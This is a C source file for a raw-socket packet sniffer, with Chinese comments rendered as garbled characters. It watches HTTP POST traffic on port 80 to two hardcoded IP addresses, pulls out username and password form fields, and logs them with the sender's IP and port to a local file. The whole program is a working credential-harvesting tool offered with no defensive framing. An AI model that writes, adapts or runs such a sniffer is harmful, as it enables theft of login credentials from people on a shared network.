#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>   // for sockaddr_in
#include <sys/types.h>    // for socket
#include <sys/socket.h>   // for socket
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <pthread.h>

#define MAX_SIZE 65537
#define USERNAME_1 "uid"
#define USERNAME_2 "user"
#define PASSWORD "password"
#define IPADDRESS_1 "210.44.144.55"
#define IPADDRESS_2 "172.17.21.121"

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //��̫��Ŀ�ĵ�ַ
    unsigned char SrcMAC[6];     //��̫��Դ��ַ
    unsigned short EtherType;    //֡����
} DLCHEADER;

typedef struct ipheader
{
    unsigned char ip_hl:4;    /*header length(��ͷ���ȣ�*/
    unsigned char ip_v:4;    /*version(�汾)*/
    unsigned char ip_tos;    /*type os service��������*/
    unsigned short int ip_len;   /*total length (�ܳ���)*/
    unsigned short int ip_id;   /*identification (��ʶ��)*/
    unsigned short int ip_off;   /*fragment offset field(����λ��)*/
    unsigned char ip_ttl;    /*time to live (����ʱ��)*/
    unsigned char ip_p;     /*protocol(Э��)*/
    unsigned short int ip_sum;   /*checksum(У���)*/
    unsigned int ip_src;    /*source address(Դ��ַ)*/
    unsigned int ip_dst;    /*destination address(Ŀ�ĵ�ַ)*/
} IP;         /* total ip header length: 20 bytes (=160 bits) */

typedef struct tcpheader
{
    unsigned short int sport;   /*source port (Դ�˿ں�)*/
    unsigned short int dport;   /*destination port(Ŀ�Ķ˿ں�)*/
    unsigned int th_seq;    /*sequence number(�������к�)*/
    unsigned int th_ack;    /*acknowledgement number(ȷ��Ӧ���)*/
    unsigned char th_x:4;    /*unused(δʹ��)*/
    unsigned char th_off:4;    /*data offset(����ƫ����)*/
    unsigned char Flags;    /*��־ȫ*/
    unsigned short int th_win;   /*windows(����)*/
    unsigned short int th_sum;   /*checksum(У���)*/
    unsigned short int th_urp;   /*urgent pointer(����ָ��)*/
} TCP;

FILE *file=NULL;

int CreateSocket(int *soc)
{
    if((*soc=socket(PF_PACKET,SOCK_RAW,htons(ETH_P_IP)))<0)
        return 0;

    return 1;
}

void save(char *packet,char *user,char *pass)
{
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    IPHeader=(IP *)(packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(packet+sizeof(DLCHEADER)+sizeof(IP));

    fseek(file,0,SEEK_END);
    fprintf(file,"��ԴIP:%s\t��Դ�˿�:%d\tUSER:%s\tPASS:%s\n",inet_ntoa(*(struct in_addr *)&IPHeader->ip_src),htons(TCPHeader->sport),\
            user,pass);
    fflush(file);

    return;
}

void *filter(char *packet,int RecvSize)
{
    char *Data=NULL;
    char *Puser=NULL,*Ppass=NULL;
    char *PuserEnd=NULL,*PpassEnd=NULL;
    char user[MAX_SIZE],pass[MAX_SIZE];
    char *temp=Data;
    int i,user_flag;

    if(RecvSize<=sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP)+5)
        return NULL;
    Data=packet+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP);
    memset(user,NULL,sizeof(user));
    memset(pass,NULL,sizeof(pass));
    if(strncmp(Data,"POST",4))
    {
        //�յ��Ĳ���POST���ݰ�
        return NULL;
    }
    for(i=0; i<strlen(Data)-1 && Data[i]!=NULL; i++)
        if(Data[i]=='\n')
            temp=Data+i;
    Data=temp;

    user_flag=0;
    if((Puser=strstr(Data,USERNAME_1))==NULL)
    {
        user_flag=1;
        if((Puser=strstr(Data,USERNAME_2))==NULL)
            return NULL;
    }

    if(user_flag==0)
        Puser+=strlen(USERNAME_1)+1;
    else
        Puser+=strlen(USERNAME_2)+1;

    if(!(Ppass=strstr(Puser,PASSWORD)))
    {
        //POST���ݰ�����ָ�����ֶ�
        return NULL;
    }

    Ppass+=strlen(PASSWORD)+1;
    PuserEnd=strchr(Puser,'&');
    PpassEnd=strchr(Ppass,'&');
    if(PpassEnd==NULL) PpassEnd=strchr(Ppass,'\0');
    if(!PuserEnd || !PpassEnd)
        return NULL;

    memcpy(user,Puser,PuserEnd-Puser);
    memcpy(pass,Ppass,PpassEnd-Ppass);
    save(packet,user,pass);

    return NULL;
}

int Sniffer(int *soc)
{
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;
    char *Data=NULL;
    char recvBuff[MAX_SIZE];
    int RecvSize;

    IPHeader=(IP *)(recvBuff+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(recvBuff+sizeof(DLCHEADER)+sizeof(IP));
    Data=recvBuff+sizeof(DLCHEADER)+sizeof(IP)+sizeof(TCP);

    while(1)
    {
        memset(recvBuff,NULL,sizeof(recvBuff));
        if((RecvSize=recvfrom(*soc,recvBuff,sizeof(recvBuff)-1,0,NULL,NULL))<1) continue;

        if((strcmp(inet_ntoa(*(struct in_addr *)&IPHeader->ip_dst),IPADDRESS_1)==0 || \
                strcmp(inet_ntoa(*(struct in_addr *)&IPHeader->ip_dst),IPADDRESS_2)==0) && htons(TCPHeader->dport)==80)
        {
            //���ݰ���Ŀ���ַ�Ǳ���
            filter(recvBuff,RecvSize);
        }
    }

    return 1;
}

int main(int argc,char *argv[])
{
    int socket;

    if(!CreateSocket(&socket))
    {
        printf("�����׽���ʧ�ܡ�\n");
        return -1;
    }
    if((file=fopen("Data","rt+"))==NULL)
        if((file=fopen("Data","wt+"))==NULL)
        {
            printf("�����ļ�ʧ�ܡ�\n");
            return -1;
        }
    printf("Start...\n");
    Sniffer(&socket);

    return 0;
}











